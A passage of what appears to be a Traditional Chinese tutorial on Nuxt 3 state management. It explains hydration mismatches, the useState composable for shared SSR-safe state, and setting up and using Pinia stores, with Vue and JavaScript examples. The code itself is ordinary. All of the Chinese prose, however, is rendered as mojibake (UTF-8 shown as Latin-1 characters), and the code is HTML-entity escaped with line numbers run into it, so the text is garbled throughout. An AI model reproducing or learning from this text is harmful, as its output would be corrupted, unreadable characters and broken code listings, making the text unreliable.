é€™å€‹æ•¸å­—ï¼ŒåŒæ™‚ï¼Œç€è¦½å™¨çš„èƒŒæ™¯ä¹Ÿæ­£åœ¨ä¸‹è¼‰å®¢æˆ¶ç«¯æ‰€éœ€è¦çš„ JS æº–å‚™æ¥æ‰‹åš CSRï¼Œç•¶ JS è¼‰å…¥å®Œæˆå¾Œåˆå†ä¸€æ¬¡çš„åŸ·è¡Œ Vue å…ƒä»¶çš„ const count = ref(Math.round(Math.random() * 1000)) é€™æ®µç¨‹å¼ç¢¼ï¼Œæ­¤æ™‚äº‚æ•¸ç”¢ç”Ÿäº† 101 é€™å€‹æ•¸å­—ï¼Œå®¢æˆ¶ç«¯ä¹Ÿå°±é‡æ–°æ¸²æŸ“å‡ºäº† 101 æ–¼é é¢ä¸Šï¼Œé€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼æ¯æ¬¡é‡æ–°æ•´ç†æ•¸å­—æœƒè®ŠåŒ–å…©æ¬¡çš„åŸå› ã€‚\nNuxt é è¨­çš„é€šç”¨æ¸²æŸ“ (Universal Rendering) æ¨¡å¼ï¼Œæ˜¯çµåˆäº† SSR èˆ‡ CSR çš„æŠ€è¡“ï¼Œåœ¨ Nuxt æ”¶åˆ°ç¶²é è«‹æ±‚å¾Œï¼Œæœƒåœ¨ä¼ºæœå™¨æ¸²æŸ“å‡º HTML å›å‚³è‡³ç€è¦½å™¨æ¸²æŸ“é¡¯ç¤ºå‡ºéœæ…‹é é¢ï¼ŒåŒæ™‚é–‹å§‹è¼‰å…¥éœ€è¦çš„ Vue ç¨‹å¼ç¢¼ï¼Œè®“å®¢æˆ¶ç«¯æ¥æ‰‹ç‚º SPA ä½¿å¾—ç¶²é å…·æœ‰äº’å‹•æ€§ï¼Œæ¥æ‰‹å¾Œçš„æ¸²æŸ“è¡Œç‚ºéƒ½æ˜¯åœ¨å®¢æˆ¶ç«¯é€²è¡Œçš„ CSRï¼Œé€™ä¹Ÿå°±è®“é€šç”¨æ¸²æŸ“åŒæ™‚å…¼å…· SSR å° SEO çš„å‹å–„ä»¥åŠ CSR è‰¯å¥½äº’é€šæ€§çš„ä½¿ç”¨è€…é«”é©—ã€‚\né€™ç¨®åœ¨ç€è¦½å™¨ä¸­ä½¿å¾Œç«¯æ¸²æŸ“å‡ºçš„éœæ…‹é é¢å…·æœ‰äº¤äº’æ€§ï¼Œç¨±ä¹‹ç‚ºã€ŒHydrationã€ã€‚\nä¾æ“šå®˜ç¶²æ‰€æä¾›çš„åœ–ç‰‡ï¼Œæˆ‘æ·»åŠ äº†ä¸€äº›æ–‡å­—ä¾†å¹«åŠ©ç†è§£ã€‚å‰è¿°æåˆ°äº†åœ¨ä¼ºæœå™¨æ¸²æŸ“ç¶²é  HTML çµ¦ç€è¦½å™¨æ™‚ï¼Œä½¿ç”¨å¯ä»¥æ­£å¸¸çš„çœ‹è¦‹ç¶²é ï¼Œä½†æ˜¯åœ¨ JS ä¸‹è¼‰å®Œæˆä¹‹å‰ï¼Œç¶²é æ˜¯ä¸å…·æœ‰äº’å‹•æ€§çš„ï¼Œä¹Ÿå°±æ˜¯é‚„ä¸å…·æœ‰è·¯ç”±è·³è½‰ç­‰ Vue äº’å‹•é‚è¼¯ï¼Œç›´è‡³ JS ä¸‹è¼‰å®Œå¾Œæœƒ Hydrate Vue ç¨‹å¼ç¢¼ï¼Œé€™æ™‚å®¢æˆ¶ç«¯å°±å®Œå…¨æ¥æ‰‹å¾ŒçºŒçš„äº’å‹•èˆ‡ CSRï¼Œåˆ°é€™é‚Š Hydration å®Œæˆï¼Œæˆ‘å€‘ä¹Ÿå°±èƒ½èˆ‡ç¶²ç«™å®Œæ•´çš„äº’å‹•äº†ã€‚\nå›åˆ°ä¸€é–‹å§‹çš„ä¾‹å­ï¼Œæˆ‘å€‘åœ¨ç€è¦½å™¨æ‰“é–‹é–‹ç™¼è€…å·¥å…·çš„ä¸»æ§å° (Console)ï¼Œå¯ä»¥ç™¼ç¾åˆ°å…¶å¯¦é–‹ç™¼çš„éç¨‹ï¼Œä¹Ÿå‡ºç¾äº†éŒ¯èª¤æç¤ºã€ŒHydration completed but contains mismatches.ã€ï¼Œå‘Šè¨´æˆ‘å€‘ Hydration å®Œæˆäº†ä½†æ˜¯åŒ…å«äº†ä¸åŒ¹é…ï¼Œæ­£æ˜¯å‰ç«¯èˆ‡å¾Œç«¯åˆå§‹å€¼ä¸åŒçš„éŒ¯èª¤ã€‚\næ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä»‹ç´¹ Nuxt æä¾›çš„çµ„åˆå¼å‡½æ•¸ useStateï¼Œä¾†å¯ä»¥è§£æ±ºé€™å€‹å•é¡Œã€‚\nNuxt 3 çš„ç‹€æ…‹ç®¡ç† (State Management) Nuxt æä¾›äº†ä¸€å€‹çµ„åˆå¼å‡½æ•¸ useState ç”¨ä¾†å»ºç«‹å…·æœ‰éŸ¿æ‡‰å¼åŠå°æ–¼ SSR å‹å–„çš„å…±äº«ç‹€æ…‹ã€‚\nåœ¨å‰é¢çš„ä¾‹å­æˆ‘å€‘æåˆ°å› ç‚º Hydration è€Œå°è‡´å‰å¾Œç«¯çš„åˆå§‹å€¼å¯èƒ½ä¸ä¸€è‡´ï¼Œè€Œ useState æ˜¯ä¸€å€‹å° SSR å‹å–„çš„ ref æ›¿ä»£å“ï¼Œä½¿ç”¨ useState å»ºç«‹çš„éŸ¿æ‡‰å¼è®Šæ•¸ï¼Œå®ƒçš„å€¼æœƒåœ¨ä¼ºæœå™¨ç«¯æ¸²æŸ“å¾Œèˆ‡å®¢æˆ¶ç«¯ Hydration æœŸé–“çš„å¾—ä»¥è¢«ä¿ç•™ã€‚\nuseState æœ‰å…©ç¨®æ¥æ”¶ä¸åŒæ•¸é‡åƒæ•¸çš„å‘¼å«æ–¹å¼ï¼š\n1 2 useState\u0026lt;T\u0026gt;(init?: () =\u0026gt; T | Ref\u0026lt;T\u0026gt;): Ref\u0026lt;T\u0026gt; useState\u0026lt;T\u0026gt;(key: string, init?: () =\u0026gt; T | Ref\u0026lt;T\u0026gt;): Ref\u0026lt;T\u0026gt; keyï¼šå”¯ä¸€éµï¼Œç”¨æ–¼ç¢ºä¿è³‡æ–™èƒ½è¢«æ­£ç¢ºè«‹æ±‚ä¸”ä¸é‡è¤‡ã€‚ initï¼šç”¨æ–¼æä¾›çš„åˆå§‹å€¼çµ¦ State çš„å‡½æ•¸ï¼Œé€™å€‹å‡½æ•¸ä¹Ÿå¯ä»¥å›å‚³ä¸€å€‹ refã€‚ èˆ‰å€‹ä¾‹å­ï¼Œæ–°å¢ ./pages/count.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/count.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-emerald-400\u0026#34;\u0026gt;{{ count }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const count = useState(\u0026#39;count\u0026#39;, () =\u0026gt; Math.round(Math.random() * 1000)) \u0026lt;/script\u0026gt; å¯ä»¥ç™¼ç¾ï¼Œä½¿ç”¨ useState åˆå§‹åŒ– count çš„å€¼å¾Œï¼Œç€è¦½å™¨é‡æ•´é é¢ï¼Œå°±ä¸åƒå‰é¢çš„ä¾‹å­æœƒç™¼ç”Ÿå…©æ¬¡çš„æ•¸å€¼è®Šå‹•ã€‚\nç•¶æˆ‘å€‘ä½¿ç”¨ useState ä¸¦ä»¥ count ç•¶ä½œ keyï¼Œåœ¨ç¶²é è«‹æ±‚é€²å…¥ä¼ºæœå™¨ç«¯åŸ·è¡Œæ™‚ï¼Œé‚„æ²’æœ‰é€™å€‹ count ç‹€æ…‹ï¼Œæ‰€ä»¥åŸ·è¡Œäº†åˆå§‹åŒ–å‡½æ•¸ç”¢ç”Ÿå‡ºä¸€å€‹äº‚æ•¸ï¼Œä¾‹å¦‚ 888 å°±æœƒå›å‚³çµ¦ count ç•¶ä½œéŸ¿æ‡‰å¼è®Šæ•¸çš„åˆå§‹å€¼ï¼Œæ­¤æ™‚é€™å€‹ç¶²é è«‹æ±‚ï¼Œå·²ç¶“æœ‰ä¸€å€‹ count çš„éŸ¿æ‡‰å¼ç‹€æ…‹ï¼Œç•¶å‰ç«¯æ–¼ Hydration æ­¥é©Ÿå†æ¬¡çš„åŸ·è¡Œäº†ä¸‹é¢é€™æ®µç¨‹å¼ç¢¼ï¼ŒuseState ä¸€æ¨£æ˜¯ä»¥ count ç•¶ä½œ keyï¼Œä½†æ˜¯å­˜åœ¨äº†ä¸€å€‹ç”±ä¼ºæœå™¨ç«¯å»ºç«‹å¥½çš„ countï¼Œå°±æœƒç›´æ¥ä½¿ç”¨è©²ç‹€æ…‹ï¼Œä¹Ÿå°±ä¸æœƒåœ¨åŸ·è¡Œåˆå§‹åŒ–å‡½æ•¸ï¼Œè€Œå°è‡´å‰å¾Œç«¯çš„åˆå§‹ç‹€æ…‹ä¸ä¸€è‡´çš„å•é¡Œã€‚\n1 const count = useState(\u0026#39;count\u0026#39;, () =\u0026gt; Math.round(Math.random() * 1000)) useState çš„åŸºæœ¬ç”¨æ³• æ–°å¢ ./pages/counter/increment.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/counter/increment.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-600\u0026#34;\u0026gt;{{ counter }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex flex-row\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter++\u0026#34; \u0026gt; å¢åŠ  \u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter--\u0026#34; \u0026gt; æ¸›å°‘ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-slate-500\u0026#34;\u0026gt;å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡é€²å…¥é€™å€‹é é¢ï¼Œæ•¸å€¼åˆå§‹è¨­å®šç‚º 0\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;å›é¦–é \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const counter = useState(\u0026#39;counter\u0026#39;, () =\u0026gt; 0) \u0026lt;/script\u0026gt; æˆ‘å€‘ä½¿ç”¨ useState ä¸¦ä»¥ counter ç•¶ä½œ keyï¼Œé¦–æ¬¡æ–¼å¾Œç«¯æ¸²æŸ“æ™‚æœƒåˆå§‹åŒ–ç‚º 0ï¼Œç•¶å‰ç«¯Hydration æ­¥é©Ÿè¼‰å…¥ Vue æˆ–è·³è½‰é é¢ï¼Œå› ç‚ºä½¿ç”¨ç›¸åŒçš„ key æ‰€ä»¥é€™å€‹ç‹€æ…‹ä¹Ÿæœƒç¹¼çºŒè¢«ä¿ç•™ï¼Œç›´è‡³æˆ‘å€‘ä¸‹ä¸€æ¬¡é‡æ–°æ•´ç†ç¶²é ã€‚\nuseState çš„å…±äº«ç‹€æ…‹ å‰é¢ useState çš„åŸºæœ¬ç”¨æ³•ä»¥ counter ç•¶ä½œ keyï¼Œæˆ‘å€‘å¯ä»¥å†å»ºç«‹ä¸åŒçš„é é¢å…ƒä»¶ä¸¦ä½¿ç”¨ useState('counter') å°±å¯ä»¥æŠŠé€™å€‹ç‹€æ…‹æ‹¿åšå‡ºä¾†ç”¨ï¼Œä¹Ÿå°±é”åˆ°äº†åœ¨ä»»ä½•å…ƒä»¶ä¸­å¯ä»¥å…±äº«ç›¸åŒçš„éŸ¿æ‡‰å¼ç‹€æ…‹ã€‚\næ–°å¢ ./pages/counter/surprise.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/counter/surprise.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-600\u0026#34;\u0026gt;{{ counter }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex flex-row\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter++\u0026#34; \u0026gt; å¢åŠ  \u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counter--\u0026#34; \u0026gt; æ¸›å°‘ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-slate-500\u0026#34;\u0026gt;å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡é€²å…¥é€™å€‹é é¢ï¼Œæ•¸å€¼åˆå§‹è¨­å®šç‚ºäº‚æ•¸\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;å›é¦–é \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const counter = useState(\u0026#39;counter\u0026#39;, () =\u0026gt; Math.round(Math.random() * 1000)) \u0026lt;/script\u0026gt; æˆ‘å€‘å¯ä»¥ä»»æ„å°èˆªè‡³ /counter/increment èˆ‡ /counter/surprise é é¢ï¼Œå¯ä»¥ç™¼ç¾å…©å€‹é é¢å¯ä»¥å…±äº«ç›¸åŒçš„ counter ç‹€æ…‹ï¼Œç•¶é¦–æ¬¡é€²å…¥æˆ–é‡æ–°æ•´ç† increment.vue é é¢ï¼Œæœƒå°‡ counter åˆå§‹åŒ–ç‚º 0ï¼›è€Œé¦–æ¬¡é€²å…¥æˆ–é‡æ–°æ•´ç† surprise.vue é é¢å‰‡æ˜¯ç”¢ç”Ÿä¸€å€‹äº‚æ•¸çµ¦äºˆ counterã€‚\nç•¶ç„¶ä½ ä¹Ÿå¯ä»¥ç›´æ¥åœ¨å…¶ä»–å…ƒä»¶ä¸­ä½¿ç”¨ useState('counter')ï¼Œå°±å¯ä»¥å–å¾—å…±äº«çš„éŸ¿æ‡‰å¼è£æ…‹ï¼Œä½†å¦‚æœé€™å€‹å…ƒä»¶æ˜¯åˆæ¬¡é€²å…¥è€Œæ²’æœ‰é è¨­å€¼çš„å»ºç«‹å‡½æ•¸ï¼Œå¯èƒ½æœƒå¼•ç™¼ä¸€äº›éŒ¯èª¤ï¼Œè¦ç‰¹åˆ¥çš„æ³¨æ„ã€‚\nä½¿ç”¨çµ„åˆå¼å‡½æ•¸å»ºç«‹å…±äº«ç‹€æ…‹ å¦‚ä¸‹ä¾‹å­ï¼Œæˆ‘å€‘å¯ä»¥å»ºç«‹çµ„åˆå¼å‡½æ•¸ (Composables) ä¾†æ­é… useStateã€‚\næ–°å¢ ./composables/states.tsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\ncomposables/states.ts 1 export const useColor = () =\u0026gt; useState\u0026lt;string\u0026gt;(\u0026#39;color\u0026#39;, () =\u0026gt; \u0026#39;green\u0026#39;) æ–°å¢ ./pages/color.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/color.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-emerald-400\u0026#34;\u0026gt;{{ color }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const color = useColor() \u0026lt;/script\u0026gt; å¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å®šç¾©å¥½çš„çµ„åˆå¼å‡½æ•¸å°±å¯ä»¥è¢«è‡ªå‹•çš„å°å…¥åŠå»ºç«‹å…·æœ‰é¡å‹å®‰å…¨çš„ç‹€æ…‹ï¼Œåœ¨å„å€‹å…ƒä»¶ä¹‹é–“å°±å¯ä»¥å‘¼å«é€™å€‹çµ„åˆå‡½æ•¸ä¾†å–å¾—å…±äº«ç‹€æ…‹ã€‚\nåœ¨é€šç”¨æ¸²æŸ“çš„æ¨¡å¼ä¹‹ä¸‹ï¼Œç€è¦½å™¨æ–¼ Hydration å®Œæˆå‰ï¼Œç¶²é é›–ç„¶èƒ½ç€è¦½ä½†æ˜¯å°šä¸å…·æœ‰äº’å‹•æ€§ï¼Œç›´è‡³ Hydration å®Œæˆå¾Œï¼ŒVue çš„é é¢å…ƒä»¶æœƒé‡æ–°è¼‰å…¥èˆ‡ç¶å®šï¼Œå› æ­¤æˆ‘å€‘å°æ–¼éŸ¿æ‡‰å¼çš„è®Šæ•¸ï¼Œå„˜é‡ä½¿ç”¨ useState ä¾†æ›¿ä»£ ref ä»¥ç¢ºä¿ Hydration å‰å¾Œçš„åˆå§‹å€¼å¾—ä»¥è¢«ä¿ç•™ï¼Œè€Œä¸” useState å› ç‚ºå¯ä»¥ä½¿ç”¨ key ä¾†ä½¿ç‹€æ…‹æ–¼å…ƒä»¶é–“å…±äº«ã€‚\nç‹€æ…‹ç®¡ç† - Store \u0026amp; Pinia ä¸Šè¿°æˆ‘å€‘ä»‹ç´¹äº†å¦‚ä½•åœ¨ Nuxt 3 ä½¿ç”¨ useState ä¾†å»ºç«‹ä¸€å€‹å…ƒä»¶é–“çš„å…±äº«ç‹€æ…‹ï¼Œéš¨è‘—å°ˆæ¡ˆçš„å¥å£¯å¢å¤§ï¼Œæˆ‘å€‘å°±éœ€è¦ä¸€å€‹æ›´å¥½çš„æ–¹å¼ä¾†ç®¡ç†èˆ‡å„²å­˜é€™äº›ç‹€æ…‹ï¼Œä¾‹å¦‚åœ¨ Vue ä¸­ä½¿ç”¨ Vuex æˆ– Pinia ä¾†å»ºç«‹ä¸€å€‹ Store ç®¡ç†é€™äº›ç‹€æ…‹å°±æ˜¯ä¸€å€‹è§£æ±ºæ–¹æ¡ˆã€‚å¦‚æœä½ é‚„ä¸äº†è§£ Piniaï¼Œå¯ä»¥ç†è§£ç‚ºæ˜¯ Vuex v5ã€‚å› ç‚ºç›®å‰ Pinia å·²ç¶“æˆç‚º Vue å®˜æ–¹æ¨è–¦çš„ç‹€æ…‹ç®¡ç†è§£æ±ºæ–¹æ¡ˆï¼Œæœ¬ç¯‡å°‡é‡å° Nuxt ä½¿ç”¨ Pinia åšä¸€å€‹ç°¡å–®çš„ä»‹ç´¹ã€‚\nPinia å¦‚æœä½ ä½¿ç”¨é Vuex å¤§æ¦‚æœƒçŸ¥é“ Vue å¦‚ä½•å»ºç«‹ Store ä¾†åšç‹€æ…‹ç®¡ç†ï¼Œéš¨è‘—æ™‚é–“ Vuex å¾ˆç©æ¥µçš„è’é›†ç¤¾ç¾¤åŠä½¿ç”¨è€…çš„æ„è¦‹ä¾†è¦åŠƒ Vuex v5ã€‚Pinia çš„ä½œè€… Eduardo æ˜¯ Vue.js æ ¸å¿ƒåœ˜éšŠçš„æˆå“¡ä¹‹ä¸€ï¼Œä¹Ÿåƒèˆ‡è‘— Vuex çš„é–‹ç™¼ï¼Œç•¶æ™‚ä»–æ­£æ¸¬è©¦è‘— Vuex v5 çš„ææ¡ˆï¼Œè€Œ Pinia æˆç‚ºæ¢ç´¢é€™äº›æ„è¦‹åŠå¯èƒ½æ€§çš„å…ˆé©…ï¼Œå¯¦ç¾äº† Vuex v5 å¯èƒ½çš„æ¨£å­ï¼Œç¾åœ¨ Pinia çš„ API å·²ç¶“é€²å…¥ç©©å®šç‹€æ…‹ï¼Œä¹Ÿæˆç‚º Vue å®˜æ–¹æ¨è–¦ä½¿ç”¨çš„ç‹€æ…‹ç®¡ç†è§£æ±ºæ–¹æ¡ˆï¼Œä¸¦éµå¾ªè‘— Vue ç”Ÿæ…‹çš„ RFC æµç¨‹ã€‚\nPinia ç›¸è¼ƒæ–¼ Vuex æœ‰ä»¥ä¸‹å·®ç•°ï¼š\næ²’æœ‰ mutationï¼Œåªéœ€è¦ä½¿ç”¨ action å°±å¯ä»¥æ”¹ç‹€æ…‹ã€‚ ä¸å†æœ‰ modules å·¢ç‹€çš„çµæ§‹ï¼Œä¹Ÿä¸å†éœ€è¦ç‚ºæ¨¡çµ„å®šç¾©å‘½åç©ºé–“ï¼Œå› ç‚ºåœ¨ Pinia ä¸­ï¼Œå¯ä»¥å®šç¾©å¤šå€‹ Store è€Œä¸”æ¯å€‹éƒ½æ˜¯ç¨ç«‹çš„ä¹Ÿéƒ½å…·æœ‰è‡ªå·±çš„å‘½åç©ºé–“ã€‚ æ›´å®Œæ•´çš„æ”¯æ´ TypeSctiptï¼Œä¹Ÿä¸å†éœ€è¦ä½¿ç”¨å¤šé¤˜çš„ types ä¾†å°è£ï¼Œæ‰€æœ‰çš„å…§å®¹éƒ½æ˜¯é¡å‹åŒ–çš„ï¼ŒPinia API çš„è¨­è¨ˆæ–¹å¼ç›¡å¯èƒ½ä½¿ç”¨ TypeSctipt é¡å‹æ¨æ–·ã€‚ éå¸¸è¼•å·§ï¼Œç´„åƒ…æœ‰ 1 KBï¼Œè€Œä¸”å¯ä»¥è‡ªå®šç¾©æ’ä»¶ã€‚ æ”¯æ´ä¼ºæœå™¨ç«¯æ¸²æŸ“ (SSR) èˆ‡ç¨‹å¼ç¢¼è‡ªå‹•æ‹†åˆ†ã€‚ Nuxt 3 å®‰è£ Pinia 1 2 3 npm install -D pinia @pinia/nuxt --force # or # yarn add -D pinia @pinia/nuxt --force ç›®å‰ç…§è‘—å®˜æ–¹å®‰è£ Piniaï¼Œæœƒç™¼ç”Ÿä¸€äº›å•é¡Œï¼Œæ‰€ä»¥æˆ‘å€‘åœ¨å®‰è£æ™‚åŠ ä¸Š \u0026ndash;force åƒæ•¸\næ·»åŠ  @pinia/nuxt è‡³ nuxt.config.ts çš„ modules å±¬æ€§ä¸­ã€‚\nnuxt.config.ts 1 2 3 export default defineNuxtConfig({ modules: [\u0026#39;@pinia/nuxt\u0026#39;] }) å»ºç«‹ç¬¬ä¸€å€‹ Pinia çš„ Store Pinia æä¾›äº†ä¸€å€‹å‡½æ•¸ defineStore ç”¨ä¾†å®šç¾© storeï¼Œå‘¼å«æ™‚éœ€è¦ä¸€å€‹å”¯ä¸€çš„åç¨±ä¾†ç•¶ä½œç¬¬ä¸€å€‹åƒæ•¸å‚³éï¼Œä¹Ÿç¨±ä¹‹ç‚º idï¼ŒPinia æœƒä½¿ç”¨å®ƒä¾†å°‡ store é€£æ¥åˆ° devtoolsã€‚\nå»ºè­°å°‡å›å‚³çš„å‡½æ•¸å‘½åç‚º use...ï¼Œä¾‹å¦‚ useCounterStoreï¼Œuse ä½œç‚ºé–‹é ­æ˜¯çµ„åˆå¼å‡½æ•¸å‘½åçš„ç´„å®šï¼Œä¾†ç¬¦åˆä½¿ç”¨ä¸Šçš„ç¿’æ…£ã€‚\nè€Œ defineStore çš„ç¬¬äºŒå€‹åƒæ•¸ï¼Œå¯ä»¥å‚³å…¥ Options ç‰©ä»¶æˆ–æ˜¯ Setup å‡½æ•¸ï¼Œä¾‹å¦‚æˆ‘å€‘ä½¿ç”¨ Options ä¾†å®šç¾©ä¸€å€‹ Storeï¼Œæ–°å¢ ./stores/counter.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nstores/counter.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore(\u0026#39;counter\u0026#39;, { state: () =\u0026gt; ({ count: 0 }), actions: { increment() { this.count += 1 }, decrement() { this.count -= 1 } }, getters: { doubleCount: (state) =\u0026gt; state.count * 2 } }) å¯ä»¥ç™¼ç¾åˆ°èˆ‡ Vue çš„ Options API éå¸¸é¡ä¼¼ï¼Œæˆ‘å€‘å¯ä»¥å‚³éå¸¶æœ‰ stateã€actions å’Œ getters å±¬æ€§çš„ç‰©ä»¶ã€‚é€™äº›å±¬æ€§æ­£å¥½è®“ Store èˆ‡ Options API å‘¼æ‡‰å½¼æ­¤çš„é—œä¿‚ï¼Œå¦‚ state å°æ‡‰ dataã€actions å°æ‡‰ methods è€Œ getters å°æ‡‰ computedã€‚\né‚„æœ‰å¦ä¸€ç¨®æ–¹å¼å¯ä»¥ä¾†å®šç¾© Storeï¼Œèˆ‡ Vue Composition API çš„ setup å‡½æ•¸é¡ä¼¼ï¼Œæˆ‘å€‘å¯ä»¥å‚³å…¥ä¸€å€‹å‡½æ•¸ï¼Œé€™å€‹å‡½æ•¸è£¡é¢å®šç¾©éŸ¿æ‡‰å¼å±¬æ€§ã€æ–¹æ³•ç­‰å‡½æ•¸ï¼Œæœ€å¾Œå›å‚³æˆ‘å€‘æƒ³å…¬é–‹çš„å±¬æ€§å’Œæ–¹æ³•æ‰€çµ„æˆçš„ç‰©ä»¶ã€‚\nä»¥ setup å‡½æ•¸å®šç¾© counter storeï¼Œå…§å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { defineStore } from \u0026#39;pinia\u0026#39; export const useCounterStore = defineStore(\u0026#39;counter\u0026#39;, () =\u0026gt; { const count = ref(0) const increment = () =\u0026gt; { count.value += 1 } const decrement = () =\u0026gt; { count.value -= 1 } const doubleCount = computed(() =\u0026gt; count.value * 2) return { count, increment, decrement, doubleCount } }) é–‹å§‹ä½¿ç”¨ Store æˆ‘å€‘åªéœ€è¦åœ¨å…ƒä»¶ä¸­ï¼Œå¦‚ä¸‹ç¨‹å¼ç¢¼åŒ¯å…¥ä¸¦å‘¼å« useCounterStore() å°±å¯ä»¥æ“ä½œ store è£¡é¢çš„æ–¹æ³•æˆ–å±¬æ€§å›‰ï¼\n1 2 3 import { useCounterStore } from \u0026#39;@/stores/counter\u0026#39; const counterStore = useCounterStore() æˆ‘å€‘æ–°å¢ä¸€å€‹é é¢å…ƒä»¶ ./pages/counter.vueï¼Œå…§å®¹å¦‚ä¸‹ï¼š\npages/counter.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-600\u0026#34;\u0026gt;{{ counterStore.count }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8 flex flex-row\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counterStore.increment\u0026#34; \u0026gt; å¢åŠ  \u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;font-base mx-2 rounded-full bg-sky-500 px-4 py-2 text-xl text-white hover:bg-sky-600 focus:outline-none focus:ring-2 focus:ring-sky-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;counterStore.decrement\u0026#34; \u0026gt; æ¸›å°‘ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;å›é¦–é \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useCounterStore } from \u0026#39;@/stores/counter\u0026#39; const counterStore = useCounterStore() \u0026lt;/script\u0026gt; é€™æ¨£æˆ‘å€‘å°±å®Œæˆäº†ä¸€å€‹ store çš„é¡¯ç¤ºç‹€æ…‹å€¼ï¼Œé€éå‘¼å« counterStore å…§å®šç¾©çš„ increment èˆ‡ decrement 